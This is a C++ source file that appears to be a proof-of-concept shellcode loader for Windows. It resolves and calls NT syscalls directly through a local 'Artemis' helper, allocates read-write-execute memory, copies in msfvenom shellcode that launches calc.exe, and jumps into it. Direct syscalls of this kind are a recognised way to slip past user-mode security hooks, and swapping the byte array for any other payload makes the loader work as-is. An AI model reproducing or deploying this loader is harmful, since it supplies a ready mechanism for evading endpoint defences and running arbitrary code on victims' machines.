// main.cpp
#include <iostream>
#include <Windows.h>
#include "../artemis.cpp"  // Local Header

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

extern "C" NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle,
                                            PVOID* BaseAddress,
                                            ULONG_PTR ZeroBits,
                                            PSIZE_T RegionSize,
                                            ULONG AllocationType,
                                            ULONG Protect
);

// Declare the prototype for the NtProtectVirtualMemory syscall function
extern "C" NTSTATUS NtProtectVirtualMemory(HANDLE ProcessHandle, 
                                           PVOID *BaseAddress,
                                           PSIZE_T NumberOfBytesToProtect,
                                           ULONG NewAccessProtection,
                                           PULONG OldAccessProtection,
                                           int syscallID);

extern "C" void jumper(UINT64* location);

Artemis artemis;

int syscallID = artemis.controller("NtProtectVirtualMemory");

int main() {

    PVOID baseAddress = nullptr;
    SIZE_T regionSize = 4096;
    DWORD allocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD protect = PAGE_EXECUTE_READWRITE;

    // Get the process handle for the current process
    HANDLE processHandle = GetCurrentProcess();

    // Call the NtAllocateVirtualMemory function from the assembly code
    printf("\nBreak1");
    NTSTATUS vpStatus = NtAllocateVirtualMemory(
        processHandle, &baseAddress, 0, &regionSize, allocationType, protect
    );

    if (vpStatus == 0) {
        std::cout << "Allocated memory at: " << baseAddress << std::endl;
    } else {
        std::cout << "Memory allocation failed. Status: 0x" << std::hex << vpStatus << std::endl;
    }

    printf("Base Address of VirtualAlloc: %p", baseAddress);

    // x64 calc.exe cmd from msfvenom
    unsigned char buf[] = 
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
        "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
        "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
        "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
        "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
        "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
        "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
        "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
        "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
        "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
        "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
        "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
        "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
        "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
        "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
        "\x63\x2e\x65\x78\x65\x00";

    *(UINT64*)baseAddress = *buf;
    memcpy(baseAddress, buf, sizeof(buf));  // copy into allocated mem location

    // Call the NtProtectVirtualMemory syscall from the assembly file
    ULONG oldProtect;
    NTSTATUS status = NtProtectVirtualMemory(GetCurrentProcess(), &baseAddress,
                                             &regionSize, protect, &oldProtect, syscallID);

    printf("jumperr");
    jumper((UINT64*)baseAddress);

    if (NT_SUCCESS(status)) {
        std::cout << "Memory protection changed successfully." << std::endl;
    } else {
        std::cout << "NtProtectVirtualMemory failed. Status: 0x" << std::hex << status << std::endl;
    }

    // Free the allocated memory
    VirtualFree(baseAddress, 0, MEM_RELEASE);

    while(true) {

    }

    return 0;
}
